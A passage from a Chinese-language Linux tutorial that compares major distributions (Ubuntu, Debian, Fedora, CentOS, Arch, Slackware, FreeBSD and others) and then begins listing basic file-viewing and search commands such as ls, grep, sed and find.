会采用最新的技术，尝试很多新功能、新特性，取得成功后会应用到 RHEL 版本中，可以理解为是 RHEL 的个人桌面版和前期测试版。</p><p>CentOS 全称 Community Enterprise Operating System（社区企业操作系统），可以理解为是 RHEL 的社区克隆版。完全免费，并且开源。其独有的 yum 命令支持系统在线升级，可以即时更新。CentOS 稳定性较好，在中国应用比较广泛。</p><h4 id="slackware家族"><a class="markdownIt-Anchor" href="#slackware家族">#</a> SlackWare 家族</h4><p>SLES SUSE Linux Enterprise Server ，企业版，基于 SlackWare Linux 发展而来，由德国的 SuSE Linux AG 公司与 1994 年发行。</p><p>OpenSuse 是 SLES 的社区版本。2004 年 SuSE Linux AG 被 Novell 公司收购以后，成立了 OpenSUSE 社区，于是推出了 OpenSuse 版本，比较适用于桌面系统。它和 SLES 有点类似于 Fedora 和 RHEL 的关系。</p><h4 id="其他-linux-版本"><a class="markdownIt-Anchor" href="#其他-linux-版本">#</a> 其他 Linux 版本</h4><p>Linux 还有很多其他的版本，比如 Gentoo Linux, 它的标志是追求极限的性能，在同样的硬件环境下拥有最快的运行速度。不过它需要采用源码包编译安装操作系统，非常复杂，但这也并不妨碍大量的的用户和开发者拥入它的怀抱。</p><p>下面我用一张表格来总结 Linux 不同家族和发行版本的关系与特点：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1624002060229-df09cbe1-b4f2-4b93-bf08-356890bef725.png" alt="img"></p><h4 id="linux-mint"><a class="markdownIt-Anchor" href="#linux-mint">#</a> linux mint</h4><p>Linux Mint 是一个基于 Ubuntu 的发行版，最早于 2006 年由居住在爱尔兰的法国出生的 IT 专家 Clement Lefebvre 发布。最初维护一个专门为新 Linux 用户提供帮助，技巧和文档的 Linux 网站，笔者看到了开发 Linux 发行版的必要性，该发行版致力于解决那些技术性较强的产品的使用问题，让它们更易于使用。在他的网站上向访问者征求反馈意见之后，他继续把许多人提到的 “改进的 Ubuntu” 或 “Ubuntu 完善版” 的东西建立起来。注：Ubuntu 就是以易用，对新手友好著称的。可想而知 Mint 的目标更进一步，让 Linux 更加的贴近了普通用户。</p><p>但是，Linux Mint 不仅仅是一个具有新的应用程序和更新的桌面主题的 Ubuntu。自开始以来，开发人员一直在增加各种 Mint 下的图形工具以提高可用性；这包括 mintDesktop – 用于配置桌面环境的实用程序，mintMenu – 一个新的，优雅的菜单结构，以方便导航，mintInstall – 一个易于使用的软件安装程序，mintUpdate – 一个软件更新程序，提供了一些更突出的几个工具和数百个额外的改进。该项目还开发了很多替代的专有程序以避免一些潜在的法律版权问题，其中包括专利和专利设计的多媒体编解码器，这些编解码器在很多发行版中通常是不存在的。因此，Mint 在易用性方面的声誉得到了进一步的加强，也许 Linux Mint 的最佳特性之一就是开发人员倾听用户的意见，并总是快速地实施好的建议。</p><p>因为 Linux Mint 是可以免费下载，因此该项目通过捐赠，广告和专业支持服务获得收入。它没有固定的发布时间表或者计划的功能列表，但是在每个 Ubuntu 长期支持版本发布几周后，可以预期 Linux Mint 的新版本。除 Mint 的 MATE 和 Cinnamon 桌面两个主要版本之外，该项目还使用包括 KDE 和 Xfce 在内的其他桌面版本构建版本。这些版本通常在两个 “主要” 版本几周后完成，有时可能会缺少一些主要分支中中的一些 “Mint” 工具和其他功能。 Mint 系列的另一个版本是基于 Debian 稳定版分支的 “Debian 版”。 Linux Mint 的 Debian 版本提供了非常稳定的基础，而桌面软件包的更新速度比 Mint 的 “主要分支” 版本更快。 Linux Mint 不适用软件自由原则，也不会发布安全公告。</p><p>优点：精心整理的内部开发的 “Mint” 工具，数百个用户友好的增强功能，包含多媒体编解码器缺点：“社区” 版本，因此可能并不总是包含最新的功能。另外，项目不会发布安全建议软件包管理： mintInstall 包管理器，使用 DEB 包（与 Ubuntu 兼容）可用的版本：“主” 版本（MATE 和 Cinnamon 桌面），“社区” 版本（KDE 和 Xfce 桌面），Linux Mint “Debian” 版本（MATE 或 Cinnamon 桌面）替代选择：Ubuntu, elementary OS, Zorin OS, Lubuntu, Xubuntu, Peppermint OS</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/jpeg/2942226/1624002266219-56b266f9-3e89-436c-a41c-6da5633b65ee.jpeg" alt="img"></p><h4 id="ubuntu"><a class="markdownIt-Anchor" href="#ubuntu">#</a> Ubuntu</h4><p>Ubuntu 的推出是在 2004 年 9 月首次宣布的。尽管这个项目在 Linux 发行版中是一个相对较新的，但是它的邮件列表很快就被热情的用户和开发人员所占领。随后的几年中，Ubuntu 发展成为最受欢迎的桌面 Linux 发行版，并为开发易于使用和免费的桌面操作系统做出了巨大贡献，该操作系统成为市场上专有桌面操作系统强有力的竞争者。</p><p>Ubuntu 成功的原因是什么？首先，这个项目是由南非千万富翁，前 Debian 开发人员和全球第二位太空游客 Mark Shuttleworth 共同创建的，该公司是位于马恩岛的 Canonical Ltd 公司，目前正在为该项目提供资金。其次，Ubuntu 从其他类似项目的错误中吸取教训，并从一开始就避免了这些错误 – 它创建了一个优秀的基于 Web 的基础架构，其中包含 Wiki 风格的文档，创造性的 bug 报告功能以及专业的管理方法。第三，由于其富有的创始人，Ubuntu 能够向所有感兴趣的用户免费发送 CD，从而有助于分发的快速普及。</p><p>在技术方面，Ubuntu 基于 Debian “Sid”（不稳定分支），但是使用的是 GNOME，Firefox 和 LibreOffice 等一些著名软件包的最新版本。它使用称为 “Unity” 独创的用户界面。它具有可预测的 6 个月发布时间表，外加一个长期支持（LTS）版本，支持 5 年的安全更新，具体取决于版本（非 LTS 版本支持 9 个月）。 Ubuntu 的其他特殊功能包括可安装的 Live DVD，独占应用和桌面主题，Windows 用户的迁移助理，支持 3D 桌面效果等最新技术，为 ATI 和 NVIDIA 图形卡以及无线网络轻松安装专有设备驱动程序，并为非免费或专利设计的媒体编解码器提供按需支持。</p><p>优点：固定发布周期和支持期；具有 5 年安全更新的长期支持（LTS）变体；新手友好；丰富的文档，官方和用户无私贡献缺点：与 Debian 有一定的兼容性问题；频繁的重大更新可能流失一些用户，Unity 用户界面被批评为更适合移动设备，而不是电脑；非 LTS 版本只有 9 个月的安全支持软件包管理：使用 DEB 包的高级包工具（APT）其他衍生版：Ubuntu，Kubuntu，Xubuntu，Lubuntu，Ubuntu GNOME，Ubuntu MATE，Ubuntu Budgie，Ubuntu Kylin，适用于 64 位（x86_64）处理器的 Ubuntu Studio; 基于 Ubuntu 的发行版： Linux Mint (桌面版本), elementary OS (桌面版本), Zorin OS (桌面版本), Pinguy OS (桌面版本),Trisquel GNU/Linux (自由软件), Bodhi Linux (Enlightenment 桌面)</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/jpeg/2942226/1624002328952-cbdde6fb-09e7-4179-9b40-53afb406a37d.jpeg" alt="img"></p><h4 id="debian-gnu-linux"><a class="markdownIt-Anchor" href="#debian-gnu-linux">#</a> Debian GNU / Linux</h4><p>Debian GNU / Linux 于 1993 年首次公布。它的创始人 Ian Murdock 的初始想法是在空闲时间创建一个由数百名志愿者开发的完全非商业项目。当时怀疑论者远远超过乐观主义者，似乎注定要夭折收尾，但实际情况却恰恰相反。 Debian 不仅幸存下来，而且还在不到十年的时间里成为了最大的 Linux 发行版，也是有史以来创建的最大的协作软件项目！</p><p>Debian GNU / Linux 的成功可以用下面的数字来说明。它由 1000 多名志愿者开发，它的软件库包含近 50,000 个二进制包（编译为 8 个处理器架构），有 120 个基于 Debian 的发行版和 live CD。这些数字是任何其他基于 Linux 的操作系统无法比拟的。 Debian 主要有三个主要分支（或四个，如果包括增加稳定性的 “实验” 分支）：“unstable”（也称为 “sid”），“testing” 和 “stable ”。软件包和功能的逐步整合和稳定性，以及项目完善的质量控制机制，使得 Debian 获得了今天可用的最佳测试和无缺陷发行版之一的声誉。</p><p>然而，这种冗长而复杂的开发风格也有一些缺点：Debian 的稳定版本并不是特别新，特别是因为新的稳定版本每 1 – 3 年才会发布一次。那些喜欢最新软件包和技术的用户被迫使用 Debian testing (测试) 或 unstable (不稳定) 分支。 Debian 高度民主的结构导致了有争议的决定，并引发了开发者之间的分歧。这导致了项目的停滞不前，没有能将项目快速推进。</p><p>优点：非常稳定；卓越的质量控制；包括超过 30,000 个软件包；支持比任何其他 Linux 发行版更多的处理器体系结构缺点：保守 – 由于支持许多处理器架构，并不总是包含更新的技术；缓释周期（每 1 – 3 年稳定释放一次）; 对开发者邮件列表和博客的讨论有时是不可能的软件包管理：使用 DEB 包的高级包工具（APT）可用的版本：12 个处理器架构的安装 CD/DVD 和 live CD 映像，包括来自 Intel，AMD，Power 和其他所有 32 位和 64 位处理器基于 Debian 的替代方案：Ubuntu, SparkyLinux (Enlightenment, JWM, LXDE, MATE, Openbox, Razor-qt, Xfce 桌面), SolydXK (Xfce 或 KDE), KNOPPIX (LXDE), Tanglu (GNOME, KDE), siduction (LXQt)</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/jpeg/2942226/1624002364222-a25a8ac9-b939-4d7e-be35-3c9c0df9f096.jpeg" alt="img"></p><h4 id="mageia"><a class="markdownIt-Anchor" href="#mageia">#</a> Mageia</h4><p>Mageia 可能是这个列表中的最新发行版，但它的来源可以追溯到 1998 年 7 月，当时 GalDuval 发布了 Mandrake Linux。当时它只是一个红帽 Linux 的分支，KDE 作为默认的桌面，更完善的硬件支持和一些用户友好的功能，加上媒体的积极评论，它获得了一定的知名度。Mandrake Linux 后来变成了一个商业版本，并在 2010 年几乎破产之前更名为 Mandriva（为了避免一些与商标有关的麻烦，并纪念与巴西的 Conectiva 合并），最终由一家俄罗斯风险投资公司拯救了，新管理层因为巨大的开支而决定在该公司巴黎总部裁减大部分的 Mandriva 开发人员。在没有工作的情况下，他们决定组建一个 Mageia，这个社区项目是 Mandrake 和 Mandriva 的核心延续，或许比 Mandriva 本身更为合理。</p><p>Mageia 主要是一个桌面版本。其最受欢迎的功能是最优秀的软件应用，精良的系统管理套件（Mageia 控制中心），吸引了大量志愿者贡献者以及广泛的国际化支持。它具有最简单但功能强大的系统安装程序之一，同时还可以使用 KDE 或 GNOME 桌面和全面的语言支持。而且可以来直接从桌面安装系统，无需刻录到 U 盘。该发行版具有良好的软件包管理功能，具有强大的命令行选项和图形化软件管理模块，可以轻松访问数千个软件包。独特的 Mageia 控制中心随着每个版本的不断改进，为 Linux 的新手提供了一个强大的工具来配置他们的计算机的任何方面，而无需使用终端命令行。</p><p>尽管 Mageia 自 2010 年 9 月成立以来一直处于起步阶段，但仍有人担心其是否有能力维持长期开发的工作，毕竟大部分工作是由志愿者在完成的。此外，它缺乏一些更大的 Linux 发行版的完善的基础架构。项目的文档也需要做一些改进，而 9 个月的发布周期在引起新闻和媒体兴趣方面也可以被视为一个缺点，特别是与其他使用 6 个月的短期开发过程的主要发行版相比。</p><p>优点：适合初学者；优秀的中央配置工具；支持数十种语言的开箱即用支持；可安装的 Live 镜像缺点：与 Mandriva 分开之后，缺乏声誉和资源，有人担心开发者没有能力长期维持开发软件包管理：使用 RPM 软件包，Rpmdrake（URPMI 的图形前端）的 URPMI 包管理器可用版本：用于 32 位（i586）和 64 位（x86_64）处理器的安装 DVD; 可安装 32 位（i586）处理器的 live CD</p><p>其他选择：OpenMandriva，ROSA</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/jpeg/2942226/1624002492988-99da62d5-9803-407d-8d88-0966779088ca.jpeg" alt="img"></p><h4 id="fedora"><a class="markdownIt-Anchor" href="#fedora">#</a> Fedora</h4><p>虽然 Fedora 仅在 2004 年 9 月才正式发布，但它的起源可追溯到 1995 年，当时它是由 Bob Young 和 Marc Ewing 以 Red Hat Linux 的名义发布的。该公司的第一款产品 Red Hat Linux 1.0 “母亲节” 在同一年发布，之后很快又进行了一些错误修复更新。 1997 年，红帽公司推出了革命性的 RPM 软件包管理系统，具有依赖解决方案和其他先进功能，极大地促进了分发的迅速普及并超越 Slackware Linux 成为世界上使用最广泛的 Linux 发行版。在以后的几年中，红帽将按照正常的 6 个月发布时间表进行开发。</p><p>在 2003 年刚发布 Red Hat Linux 9 之后，该公司对其产品系列进行了一些根本性的改变。它保留了红帽商业产品的商标，特别是红帽企业 Linux，并引入了 Fedora Core（后来改名为 Fedora），这是一个红帽赞助的，但面向社区的发行版，专为 “Linux 爱好者” 设计。从刚开始的批评后，Linux 社区接受了 “新的” 发行版作为 Red Hat Linux 的核心延续版本。 Fedora 重新成为一个高质量的版本，成为市场上最受欢迎的操作系统之一。与此同时，红帽公司迅速成为全球规模最大，盈利能力最强的 Linux 公司，拥有创新的产品阵容，出色的客户支持以及红帽认证工程师（RHCE）认证计划等其他受欢迎的计划。</p><p>尽管 Fedora 的方向仍然由 Red Hat，Inc. 主要控制，并且该产品有时被看作是对红帽企业 Linux 的测试平台 (小白鼠)，无论是正确的还是错误的，无可否认，Fedora 是最具创新性的分发版之一。它对 Linux 内核，glibc 和 GCC 的贡献是众所周知的，它最近集成了 SELinux 功能，虚拟化技术，系统服务管理器，先进的日志文件系统以及其他企业级功能， 。不利的一面是，Fedora 仍然缺乏明确的面向桌面的策略，以使产品更容易用于 “Linux 爱好者” 目标以外的用户。</p><p>优点：高度创新；突出的安全功能；大量支持的软件包；严格遵守自由软件的理念；具有许多流行桌面环境的 Live CD 的可用性缺点：Fedora 的优先级倾向于倾向于企业功能，而不是桌面可用性；一些出色的边缘功能，比如早期切换到 KDE 4 和 GNOME 3，偶尔会疏远一些桌面用户软件包管理：使用 RPM 软件包的 YUM 图形和命令行工具可用的版本：用于 32 位（i386）和 64 位（x86_64）处理器的 Fedora; 还有 GNOME，KDE，LXDE，MATE 和 Xfce 桌面的 CD 版本基于 Fedora 的替代方案：Korora（GNOME，KDE，LXDE 桌面或 Xfce 桌面的 Live DVD）基于红帽的备选方案：CentOS，Scientific Linux</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/jpeg/2942226/1624002653298-1f30d30a-67ba-4afb-8c9b-202809a38448.jpeg" alt="img"></p><h4 id="opensuse"><a class="markdownIt-Anchor" href="#opensuse">#</a> openSUSE</h4><p>openSUSE 的诞生始于 1992 年，当时四位德国 Linux 爱好者 Roland Dyroff，Thomas Fehr，Hubert Mantel 和 Burchard Steinbild 以 SuSE（Software und System Entwicklung）Linux 的名义推出了该项目。在早期，这家年轻的公司出售了一套包含德语版 Slackware Linux 的软盘，但是在 SuSE Linux 于 1996 年 5 月成为独立发行版 4.2 之后不久，在随后的几年里，开发人员采用了 RPM 软件包管理格式，并推出了易于使用的图形系统管理工具 YaST。在欧洲和北美地区，SuSE Linux 的发布频繁，出色的文档和易用性使得发行日益受到欢迎。</p><p>SuSE Linux 于 2003 年底被 Novell 收购，然后于 2010 年并入 Attachmate。随着第一次收购，SUSE Linux 的开发，许可和可用性发生了重大变化 – YaST 在 General Public 许可证（GPL）中，ISO 映像是从公共下载服务器免费发布的，最重要的是，发行版的开发首次向公众开放。自从 2005 年 10 月发布 openSUSE 项目并发布 10.0 版本以来，这个发行版就变得完全免费了。 openSUSE 代码已成为 Novell 商用产品的基础系统，首先命名为 Novell Linux，后来又重新命名为 SUSE Linux Enterprise Desktop 和 SUSE Linux Enterprise Server。</p><p>今天，openSUSE 拥有大量满意的用户。 openSUSE 获得用户好评的主要原因是令人愉悦和精美的桌面环境（KDE 和 GNOME），卓越的系统管理工具（YaST）。然而，Novell 和微软之间的臭名昭着的交易，显然承认微软对 Linux 拥有知识产权的说法，已经引起许多 Linux 人士的谴责，并促使一些用户转换发行版。尽管 Novell 低调处理，微软尚未行使任何权利，这一问题仍然成为非常友善的社区 Linux 公司的郁结。</p><p>优点：全面而直观的配置工具；大型软件包库，优秀的网站基础设施和印刷文档缺点：2006 年 11 月，Novell 与微软的专利协议似乎使微软对 Linux 的知识产权声称合法化；其资源沉重的桌面设置和图形工具有时被视为 “臃肿和缓慢” 软件包管理：使用 RPM 包的 YaST 图形和命令行实用程序可用的版本：openSUSE for 32 位（i386），64 位（x86_64）处理器（也可安装 live CD 版）; 适用于 i586，IA64，PowerPC，s390，s390x 和 x86_64 体系结构的 SUSE Linux Enterprise Desktop/Server</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/jpeg/2942226/1624002741779-846a9db1-b435-4aa5-b4ea-c6c40329468b.jpeg" alt="img"></p><h4 id="arch-linux"><a class="markdownIt-Anchor" href="#arch-linux">#</a> Arch Linux</h4><p>Arch Linux 的 KISS（保持简单愚蠢）哲学是在 2002 年由加拿大计算机科学专业毕业生 Judd Vinet 在 2002 年推出的，几年来，它一直是一个为中级和高级 Linux 用户设计的边缘项目。但是它 “滚动更新”，只需要安装一次，然后保持一直更新，不要从头安装新的系统。这都要感谢其强大的包管理器和一个总是最新的软件库。因此，Arch Linux 的 “发行版” 很少，而且现在只限于一个基本的安装光盘，只有在基本系统发生相当大的变化时，才会发行新的安装介质。</p><p>Arch Linux 除了拥有备受推崇的 “滚动发布” 更新机制之外，还以其快速和强大的软件包管理器 “Pacman” 而闻名，能够从源代码安装软件包，并且由于其 AUR 基础架构，以及经过充分测试的软件包不断增加的软件库。其高度重视的文档，以及卓越的 Arch Linux 手册，使得一些高级 Linux 用户可以自行安装和定制分发。用户可以使用的强大工具意味着发行版可以无限定制到最细微的细节，并且没有两个安装可能是相同的。</p><p>不利的一面是，任何滚动更新更新机制都有其危险性：人为错误，库或依赖关系丢失，已存在于存储库中的应用程序的新版本有一个尚未报告的严重错误都可能导致系统的不稳定。在 Pacman 升级之后，最终导致无法启动的系统是经常遇到的。因此，Arch Linux 是一种需要用户警觉并具有足够的知识来解决任何这种可能的问题的发行版。此外，偶尔安装的发行版意味着有时由于重要的系统更改或在较早的 Linux 内核中缺少硬件支持而无法使用旧版本。</p><p>优点：优秀的软件管理基础设施无与伦比的定制和调整选项；一流的在线文档缺点：偶尔会出现不稳定和风险软件包管理：使用 TAR.XZ 软件包的 “Pacman” 包管理器可用的版本：64 位（x86_64）处理器的最小安装 CD 和网络安装 CD 映像基于 Arch Linux 的发行版：Manjaro Linux（与 Cinnamon，Enlightenment，KDE，LXDE，MATE，Openbox，Xfce 一起使用），Antergos（与 GNOME 3 一起使用），ArchBang Linux（使用 Openbox 的轻量级），Chakra GNU / Linux （使用 KDE 的 Live CD），Bridge Linux（使用 GNOME，KDE，LXDE 和 Xfce），Parabola GNU / Linux（免费软件），KaOS（使用 KDE）</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/jpeg/2942226/1624002794497-79a8eda8-ed6c-444c-b019-296d6b4340d0.jpeg" alt="img"></p><h4 id="centos"><a class="markdownIt-Anchor" href="#centos">#</a> centos</h4><p>CentOS 于 2003 年底推出，是一个社区项目，目标是将红帽企业 Linux（RHEL）的源代码重建为可安装的 Linux 发行版，并为所有包含的软件包提供及时的安全更新。更直白地说，CentOS 是一个 RHEL 克隆版。这两个发行版之间唯一的技术差异就是品牌 – CentOS 用自己的所有代码取代了所有的红帽商标和标识。尽管如此，红帽与 CentOS 之间的关系仍然保持友好，许多 CentOS 开发者与 Red Hat 保持着紧密的联系，甚至直接受雇于 Red Hat。</p><p>CentOS 经常被看作是一个可靠的服务器发行版。它配备了经过良好测试和稳定的 Linux 内核和软件包，构成了其母公司 Red Hat Enterprise Linux 的基础。尽管是志愿者维护的一个社区项目，但它已经赢得了市场上更高端服务器产品（尤其是经验丰富的 Linux 系统管理员）的稳定，免费替代品的声誉。 CentOS 也适合作为企业桌面解决方案，特别是在稳定性，可靠性和长期支持优于最新软件和功能的地方。像 RHEL 一样，CentOS 支持大约 7 – 10 年的安全更新。</p><p>尽管有其优势，CentOS 可能不是所有部署方案中的最佳解决方案。那些喜欢使用最新的 Linux 技术和最新的软件包进行发布的用户应该到别处去看看。主要的 CentOS 版本是在 RHEL 版本的基础上发布的，每 2 – 3 年才会发布一次，而小版本（例如 5.1）则以 6 到 9 个月为间隔。小发行通常不包含任何主要功能（虽然有时包括支持更新的硬件），只有少数软件包可能会更新到新版本。 Linux 内核，基本系统和大多数应用程序版本保持不变，但偶尔也可以在试验的基础上提供重要软件包（例如 LibreOffice 或 Firefox）的新版本。当然也有一个分支项目，CentOS 也为其发行版的用户构建了更新的软件包，但是包含它们的软件库默认是不启用的，因为它们可能会破坏上游的兼容性。</p><p>优点：非常稳定和可靠；免费下载和使用；有 7 年以上的免费安全更新；缺点：缺乏最新的 Linux 技术；有时该项目未能履行其及时提供安全更新和新稳定版本的承诺软件包管理：使用 RPM 软件包的 YUM 图形和命令行工具可用版本：用于 i386 和 x86_64 处理器的安装 DVD 和可安装的 Live CD（GNOME）; 旧版本（3.x 和 4.x）也可用于 Alpha，IA64 和 IBM z 系列（s390，s390x）处理器。其他 RHEL 克隆和基于 CentOS 的发行版：Scientific Linux，Springdale Linux，SME 服务器，Rocks Cluster Distribution，Oracle Enterprise Linux</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/jpeg/2942226/1624002883620-302fbe80-e317-4ae2-8294-5c1e5b58e1d6.jpeg" alt="img"></p><h4 id="pclinuxos"><a class="markdownIt-Anchor" href="#pclinuxos">#</a> PCLinuxOS</h4><p>PCLinuxOS 于 2003 年由比尔・雷诺兹（Bill Reynolds）首先宣布，被称为 “Texstar”。在创建自己的发行版之前，Texstar 已经是 Mandrake Linux 社区用户的知名开发人员构建的最新的 RPM 包，并提供免费下载。 2003 年，他决定建立一个新的发行版，最初基于 Mandrake Linux，但有几个显著的可用性改进。理念是应该对初学者是友好的，具有专有内核模块，浏览器插件和媒体编解码器的开箱即用的支持，并应作为一个简单直观的图形安装程序的 Live CD。</p><p>几年后的发展，PCLinuxOS 正在迅速接近其预期的状态。就可用性而言，该项目为大多数 Windows 到 Linux 移民希望从他们的新操作系统中获得的许多技术提供了开箱即用的支持。在软件方面，PCLinuxOS 是一个面向 KDE 的发行版，具有定制且始终最新版本的流行桌面环境。不断增长的软件存储库包含其他桌面，并为许多常见任务提供各种各样的桌面软件包。对于系统配置，PCLinuxOS 保留了很多 Mandriva 优秀的控制中心，但是用 APT 和 Synaptic（一个图形化的包管理前端）取代了它的包管理系统。</p><p>不利的一面是，PCLinuxOS 缺乏任何形式的路线图或发布目标。尽管越来越多的社区参与这个项目，大多数的发展和决策仍然掌握在 Texstar 的手中，他们在判断发布的稳定性时倾向于保守的一面。因此，PCLinuxOS 的开发过程往往是艰巨的。例如，尽管频繁要求 64 位版本，但开发者直到最近才开始生产 64 位版本。此外，该项目不提供任何安全建议，而是依靠用户通过所包括的管理工具保持系统最新的状态。</p><p>优点：对图形驱动程序，浏览器插件和媒体编解码器的开箱即用支持；滚动更新机制；最新的软件缺点：对非英语语言没有开箱即用的支持；缺乏发布计划和安全建议软件包管理：使用 RPM 包的高级包工具（APT）可用的版本：KDE，完整的 Monty，KDE Minime，LXDE，LXDE Mini，Openbox，Openbox 盆景，用于 64 位（x86_64）处理器体系结构的 KDE</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/jpeg/2942226/1624002971118-8b766f7f-4c51-479e-86c7-e26652141e66.jpeg" alt="img"></p><h4 id="slackware-linux"><a class="markdownIt-Anchor" href="#slackware-linux">#</a> Slackware Linux</h4><p>由 Patrick Volkerding 于 1992 年创建的 Slackware Linux 是现存最古老的 Linux 发行版。从现在停止开发的 SLS 项目中分离出来，Slackware 1.0 拥有 24 个软盘，并建立在 Linux 内核版本 0.99pl11-alpha 之上。它很快成为最受欢迎的 Linux 发行版，据估计 1995 年其市场份额占所有 Linux 安装量的 80％。随着 Red Hat Linux 和其他更友好的发行版的出现，其受欢迎程度急剧下降，但 Slackware Linux 仍然是面向更技术导向的系统管理员和桌面用户的一个备受赞赏的操作系统。</p><p>Slackware Linux 是一个高度技术性的，干净的发行版，只有非常有限的自定义实用程序。它使用一个简单的，基于文本的系统安装程序和一个比较原始的软件包管理系统，它不能解决软件依赖问题。因此，Slackware 被认为是目前可用的最干净和最不稳定的发行版之一 – 缺乏特定于 Slackware 的增强功能可以降低新问题引入系统的可能性。所有配置都是通过编辑文本文件完成的。 Linux 社区有一种说法，如果你学习红帽，你就会认识红帽，但是如果你学习了 Slackware，你就会知道 Linux。今天尤其如此，当许多其他 Linux 发行版继续开发大量定制产品以满足技术较少的 Linux 用户的需求时。</p><p>虽然这种简单的理念有其迷，但事实是，在当今世界，Slackware Linux 越来越成为构建新的定制解决方案的 “核心系统”，而不是具有各种支持的软件的完整发行版。唯一的例外是服务器市场，Slackware 仍然很受欢迎，虽然在这里，发行版的复杂升级过程和缺乏官方支持的安全更新自动化工具使得它日益失去竞争力。 Slackware 对系统基本组件的保守态度意味着它需要大量的手动安装后工作，才能被调整到现代桌面系统。</p><p>优点：高度稳定，干净，基本上没有错误，坚决遵守 UNIX 原则缺点：正式支持的应用程序数量有限；在基础包选择方面保守；复杂的升级程序软件包管理：使用 TXZ 软件包的 “pkgtool” 可用版本：适用于 32 位（i486）和 64 位（x86_64）处理器的安装 CD 和 DVD 基于 Slackware 的替代品：Zenwalk Linux（桌面），Salix（桌面，Live CD），Porteus（带有 KDE，LXDE，MATE，Razor-qt 或 Xfce 的 live CD），VectorLinux 其他类似发行版本：Arch Linux，Frugalware Linux</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/jpeg/2942226/1624003105221-1df988fd-8621-441c-ab3d-34859321bcac.jpeg" alt="img"></p><h4 id="freebsd"><a class="markdownIt-Anchor" href="#freebsd">#</a> FreeBSD</h4><p>FreeBSD 是 AT＆T UNIX 通过 Berkeley Software Distribution（BSD）的间接后裔，它的历史可以追溯到 1993 年。与 Linux 发行版不同，Linux 发行版被定义为由 Linux 内核和数千个软件应用程序组成的集成软件解决方案， 而 FreeBSD 是一个紧密集成的操作系统，由 BSD 内核和所谓的 “用户空间” 构成（因此即使没有额外的应用程序也可以使用）。一旦安装在普通的计算机系统上，这种区别就不明显了 – 就像许多 Linux 发行版一样，大量易于安装的（大部分）开源应用程序也是可支持 FreeBSD 核心。</p><p>FreeBSD 已经发展成为一个快速，高性能和非常稳定的操作系统，尤其适用于 Web 服务和类似的任务。许多具有关键任务计算基础设施的大型网络搜索引擎和组织已经在他们的计算机系统上部署和使用 FreeBSD 多年。与 Linux 相比，FreeBSD 是在一个限制少得多的许可证下分发的，它允许为任何目的而实际上不受限制的重用和修改源代码。即使是苹果公司的 Mac OS X 也是从 FreeBSD 派生出来的。除了核心操作系统之外，该项目还提供了超过 24,000 个二进制和源代码形式的软件应用程序，以方便安装在 FreeBSD 核心上。</p><p>虽然 FreeBSD 当然可以用作桌面操作系统，但是它与这个部门中流行的 Linux 发行版并没有很好的比较。文本模式系统安装程序在硬件检测或系统配置方面提供的功能很少，在安装后的设置中将大部分配置工作留给了用户。在对现代硬件的支持方面，FreeBSD 通常落后于 Linux，尤其是在支持诸如无线网卡或数码相机等，高端的台式机和笔记本电脑方面。那些试图在桌面或工作站上开发项目的用户，以充分利用 FreeBSD 的速度和稳定性，而不是 FreeBSD 本身。</p><p>优点：快速稳定；安装 24000 多个软件应用程序（或 “端口”）的可用性；非常好的文档缺点：在支持新颖和异乎寻常的硬件方面，往往落后于 Linux，商业应用程序的可用性有限；缺少图形化配置工具软件包管理：使用二进制包或基于源的 “端口”（TBZ）的完整命令行包管理基础架构，可用版本：用于 AMD64，ARM / ARMEL，i386，IA64，MIPS / MIPSEL，PC98 PowerPC，SPARC64 和 Xbox 处理器的安装 CD 基于 FreeBSD 的替代方案：PC-BSD（桌面），GhostBSD（带有 GNOME 的 live DVD）其他 BSD 的替代品：OpenBSD，NetBSD，DragonFly BSD</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/jpeg/2942226/1624003046181-1f78feae-ad57-4029-870e-2ea4f1e19fea.jpeg" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">centos镜像</span><br><span class="line">链接：https://pan.baidu.com/s/1yiExTXdBjYZLath0It6zTw </span><br><span class="line">提取码：7pff </span><br></pre></td></tr></table></figure><h2 id="2linux文件操作命令"><a class="markdownIt-Anchor" href="#2linux文件操作命令">#</a> 2：linux 文件操作命令</h2><p><strong>查看文件</strong></p><p>cd 切换目录位置</p><p>ls 目录    查看指定目录所有文件  -- 缺省当前目录</p><p>ls -l 目录 查看指定目录所有文件的详细信息 -- 同 ll 命令</p><p>ls -a 目录   查看指定目录所有文件 (包含隐藏文件)</p><p>ls -la 目录  查看指定目录所有文件的详细信息 (包含隐藏文件) -- 同 ll -a 命令</p><p>ls -lh 目录  查看指定目录所有文件的详细信息 (显示文件大小单位，人性化) -- 同 ll -h 命令</p><p>cat 文件 查看文件全部 (内容较少)</p><p>more 文件 翻页查看 (内容很多)  -- 空格 (下一页)  b (上一页)</p><p>less 文件   翻页查看 (内容很多) -- 不仅可以翻页，还可以翻行查看</p><p>tail - 行数 f 文件 显示最后几行 (行数) -- 适合用来查看 log 日志文件</p><p>head - 行数 文件  显示开头几行 (行数)</p><p>grep -v 字符 文件 查看文件，过滤显示，-v 是过滤排除，字符作用是指包含该字符的行不显示，多个字符用 &quot;[abc]&quot;</p><p>grep -E (i) 字符 文件   查看文件，过滤多个项，-E “a|b|c”; -Ei “A|b|C” 忽略大小写。注:grep -E 命令 == egrep 命令</p><p>grep 字符 文件 查看文件，过滤显示，字符作用是指包含该字符的行才显示，多个字符用 &quot;[abc]&quot;  -- 与 - v 相反</p><p>sed -n / 字符 /p 文件  查看文件，过滤显示，字符作用是指包含该字符的行才显示，多个字符用 &quot;[abc]&quot;</p><p>sed -n 数字，数字 p 文件 查看文件 指定行号的内容</p><p>awk -F “分隔符” ‘{print $0}’ 文件名 查看文件，指定分隔符，显示分隔后的列 “$0” 表示显示整行，1 表示第一列，以此类推</p><p><strong>查找文件</strong></p><p>find 目录 文件名 查找文件</p><p>find 目录 -type f -name 文件名 查找文件，指定查找的类型 